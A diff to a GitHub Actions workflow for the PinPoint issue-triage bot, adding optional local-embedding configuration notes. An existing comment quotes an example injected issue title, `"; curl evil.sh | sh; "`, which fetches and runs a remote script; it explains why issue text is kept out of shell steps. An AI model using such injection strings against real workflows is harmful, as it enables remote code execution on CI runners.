@@ -44,6 +44,11 @@ jobs:
         env:
           PINPOINT_SOURCE: git+https://github.com/Vishaal-G/PinPoint.git
 
+      # Optional: embed on the runner instead of the Databricks endpoint (bge-small through fastembed,
+      # ~16 s extra install, no PyTorch). Install "pinpoint[bot,local-embed] @ ..." above and add to the
+      # Triage env:  PINPOINT_EMBEDDER: local  and  FASTEMBED_CACHE_PATH: ~/.cache/pinpoint/fastembed
+      # (keeps the model in the cache above). The LLM step still uses Databricks.
+
       # The issue text is NOT interpolated here (no ${{ github.event.issue.* }} in `run:`): a title like
       # `"; curl evil.sh | sh; "` would run as shell. pinpoint-bot reads it from $GITHUB_EVENT_PATH as data.
       - name: Triage
